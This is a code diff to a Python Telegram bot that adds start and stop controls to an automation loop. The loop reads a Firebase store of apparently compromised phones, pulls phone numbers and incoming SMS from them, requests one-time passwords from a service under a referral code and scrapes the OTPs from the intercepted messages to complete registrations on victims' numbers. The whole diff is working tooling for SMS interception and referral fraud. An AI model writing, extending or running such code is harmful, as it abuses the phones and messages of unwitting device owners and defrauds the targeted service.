@@ -31,11 +31,13 @@ TIMEOUT = 30
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
 
-# In-memory storage for session configurations (Strictly 1 code max)
+# In-memory storage for session configurations and running tasks control
 USER_DATA = {
     "firebase": None,
     "codes": [],  # Max length enforced to 1
-    "proxies": []
+    "proxies": [],
+    "is_running": False,
+    "current_task": None
 }
 
 class Form(StatesGroup):
@@ -210,6 +212,10 @@ class AsyncHero11Client:
 # 🤖 TELEGRAM KEYBOARDS & INTERACTIVE MENUS
 # ==============================================================================
 def get_main_menu():
+    if USER_DATA["is_running"]:
+        return InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🛑 Stop Automation", callback_data="stop_automation")]
+        ])
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔗 Add Firebase", callback_data="add_firebase"),
          InlineKeyboardButton(text="📝 Add Refer Code (Max 1)", callback_data="add_codes")],
@@ -288,7 +294,6 @@ async def process_codes_input(message: types.Message, state: FSMContext):
     if not code:
         await message.answer("❌ Code cannot be empty. Try again:")
         return
-    # Strictly enforce max 1 code
     USER_DATA["codes"] = [code]
     await state.clear()
     await message.answer(f"✅ Active Refer Code set to: <code>{code}</code> (Strictly 1 code max)", parse_mode="HTML", reply_markup=get_main_menu())
@@ -355,137 +360,159 @@ async def cb_check_proxies(callback: types.CallbackQuery):
     await status_msg.edit_text(f"⚡ Proxy Health Check Complete!\n🟢 Working Proxies: {working}/{len(USER_DATA['proxies'])}", reply_markup=get_main_menu())
     await callback.answer()
 
+@dp.callback_query(F.data == "stop_automation")
+async def cb_stop_automation(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    if USER_DATA["current_task"] and not USER_DATA["current_task"].done():
+        USER_DATA["current_task"].cancel()
+    USER_DATA["is_running"] = False
+    await callback.message.answer("🛑 <b>Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
+    await callback.answer()
+
 @dp.callback_query(F.data == "start_automation")
 async def cb_start_automation(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
+        return
+    if USER_DATA["is_running"]:
+        await callback.answer("⚠️ Automation is already running!", show_alert=True)
         return
     if not USER_DATA["firebase"] or not USER_DATA["codes"]:
         await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
         return
 
-    firebase_url = USER_DATA["firebase"]
-    current_code = USER_DATA["codes"][0]
-    total_needed = 2  # Exactly 2 refers required for the 1 code
+    USER_DATA["is_running"] = True
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Target: 2 registrations.", parse_mode="HTML", reply_markup=get_main_menu())
+    
+    async def run_automation():
+        firebase_url = USER_DATA["firebase"]
+        current_code = USER_DATA["codes"][0]
+        total_needed = 2
+        success_count = 0
+        registered_numbers = []
+        skipped_phones = set()
+        used_phones = set()
+        logger = LiveLogger(status_msg)
 
-    status_msg = await callback.message.answer(f"🚀 <b>Automation started!</b> Target Needed: exactly 2 registrations for code <code>{current_code}</code>", parse_mode="HTML")
-    success_count = 0
-    registered_numbers = []
-    skipped_phones = set()
-    used_phones = set()
-    logger = LiveLogger(status_msg)
-
-    # Strictly continue scanning until exact quota (2 registrations) is met
-    while success_count < total_needed:
-        import aiohttp
-        online_targets = []
-        total_online_count = 0
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
-                    clients_data = await r.json() or {}
-
-                for cid, cdata in clients_data.items():
-                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                        total_online_count += 1
-                        if cid not in skipped_phones and cid not in used_phones:
-                            try:
-                                async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
-                                    msgs = await m_req.json()
-                                    phone = extract_phone(msgs) if msgs else None
-                                    if phone:
-                                        full_phone = "+91" + phone
-                                        if full_phone not in skipped_phones and full_phone not in used_phones:
-                                            online_targets.append({"cid": cid, "phone": full_phone})
-                            except Exception:
-                                pass
-        except Exception as e:
-            await logger.set_text(f"⚠️ Firebase connection error: {e}. Retrying in 5s...")
-            await asyncio.sleep(5)
-            continue
-
-        if not online_targets:
-            await logger.set_text("🔴 Exhausted available online devices in Firebase. Waiting for new devices...")
-            await asyncio.sleep(5)
-            continue
-
-        target = online_targets[0]
-        cid = target["cid"]
-        phone = target["phone"]
-        used_phones.add(phone)
-
-        await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
-
-        async with aiohttp.ClientSession() as session:
-            known_keys = set()
-            try:
-                async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
-                    k_data = await r.json()
-                    if isinstance(k_data, dict):
-                        known_keys = set(k_data.keys())
-            except Exception:
-                pass
-
-        client = AsyncHero11Client(phone, current_code)
-        send_status = await client.send_otp()
-
-        if send_status != "SUCCESS":
-            skipped_phones.add(phone)
-            await client.close()
-            continue
-
-        await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")
-
-        otp_found = None
-        start_poll = time.time()
-        while time.time() - start_poll < OTP_TIMEOUT:
-            await asyncio.sleep(POLL_INTERVAL)
-            try:
+            while success_count < total_needed and USER_DATA["is_running"]:
+                import aiohttp
+                online_targets = []
+                total_online_count = 0
+                
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
-                        msgs = await r.json()
-                        if isinstance(msgs, dict):
-                            for msg_key, msg_val in msgs.items():
-                                if msg_key not in known_keys and isinstance(msg_val, dict):
-                                    txt = str(msg_val.get("body") or msg_val.get("message") or "")
-                                    for otp in re.findall(r'\b(\d{6})\b', txt):
-                                        if otp not in ["000000", "123456", "111111", "999999"]:
-                                            otp_found = otp
-                                            break
-                            if otp_found:
-                                break
-            except Exception:
-                pass
+                    async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
+                        clients_data = await r.json() or {}
 
-        if not otp_found:
-            skipped_phones.add(phone)
-            await client.close()
-            continue
+                    for cid, cdata in clients_data.items():
+                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                            total_online_count += 1
+                            if cid not in skipped_phones and cid not in used_phones:
+                                try:
+                                    async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
+                                        msgs = await m_req.json()
+                                        phone = extract_phone(msgs) if msgs else None
+                                        if phone:
+                                            full_phone = "+91" + phone
+                                            if full_phone not in skipped_phones and full_phone not in used_phones:
+                                                online_targets.append({"cid": cid, "phone": full_phone})
+                                except Exception:
+                                    pass
 
-        await logger.set_text(f"🎯 Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
-        v_res = await client.verify_otp(otp_found)
+                if not online_targets:
+                    await logger.set_text("🔴 Exhausted online devices. Waiting for new devices...")
+                    await asyncio.sleep(5)
+                    continue
 
-        if v_res == "SUCCESS":
-            success_count += 1
-            skipped_phones.add(phone)
-            registered_numbers.append(phone)
-            await logger.set_text(f"✅ SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
-        else:
-            skipped_phones.add(phone)
+                target = online_targets[0]
+                cid = target["cid"]
+                phone = target["phone"]
+                used_phones.add(phone)
 
-        await client.close()
-        await asyncio.sleep(1.5)
+                await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
-    # Format the exact registered numbers list output
-    numbers_list_str = "\n".join([f"• <code>{num}</code>" for num in registered_numbers])
-    final_msg = (
-        f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🟢 <b>Online Devices Detected:</b> {total_online_count}\n"
-        f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
-        f"📱 <b>Exact Registered Numbers:</b>\n{numbers_list_str}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
+                async with aiohttp.ClientSession() as session:
+                    known_keys = set()
+                    try:
+                        async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
+                            k_data = await r.json()
+                            if isinstance(k_data, dict):
+                                known_keys = set(k_data.keys())
+                    except Exception:
+                        pass
+
+                client = AsyncHero11Client(phone, current_code)
+                send_status = await client.send_otp()
+
+                if send_status != "SUCCESS":
+                    skipped_phones.add(phone)
+                    await client.close()
+                    continue
+
+                await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")
+
+                otp_found = None
+                start_poll = time.time()
+                while time.time() - start_poll < OTP_TIMEOUT and USER_DATA["is_running"]:
+                    await asyncio.sleep(POLL_INTERVAL)
+                    try:
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
+                                msgs = await r.json()
+                                if isinstance(msgs, dict):
+                                    for msg_key, msg_val in msgs.items():
+                                        if msg_key not in known_keys and isinstance(msg_val, dict):
+                                            txt = str(msg_val.get("body") or msg_val.get("message") or "")
+                                            for otp in re.findall(r'\b(\d{6})\b', txt):
+                                                if otp not in ["000000", "123456", "111111", "999999"]:
+                                                    otp_found = otp
+                                                    break
+                                    if otp_found:
+                                        break
+                    except Exception:
+                        pass
+
+                if not otp_found:
+                    skipped_phones.add(phone)
+                    await client.close()
+                    continue
+
+                await logger.set_text(f"🎯 Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
+                v_res = await client.verify_otp(otp_found)
+
+                if v_res == "SUCCESS":
+                    success_count += 1
+                    skipped_phones.add(phone)
+                    registered_numbers.append(phone)
+                    await logger.set_text(f"✅ SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
+                else:
+                    skipped_phones.add(phone)
+
+                await client.close()
+                await asyncio.sleep(1.5)
+
+            USER_DATA["is_running"] = False
+            if success_count >= total_needed:
+                numbers_list_str = "\n".join([f"• <code>{num}</code>" for num in registered_numbers])
+                final_msg = (
+                    f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🟢 <b>Online Devices Detected:</b> {total_online_count}\n"
+                    f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
+                    f"📱 <b>Exact Registered Numbers:</b>\n{numbers_list_str}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━"
+                )
+                await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
+            else:
+                await callback.message.answer("🛑 <b>Automation was stopped.</b>", parse_mode="HTML", reply_markup=get_main_menu())
+
+        except asyncio.CancelledError:
+            USER_DATA["is_running"] = False
+        except Exception as e:
+            USER_DATA["is_running"] = False
+            await callback.message.answer(f"❌ Error in automation loop: {e}", reply_markup=get_main_menu())
+
+    USER_DATA["current_task"] = asyncio.create_task(run_automation())
     await callback.answer()
 
 async def main():
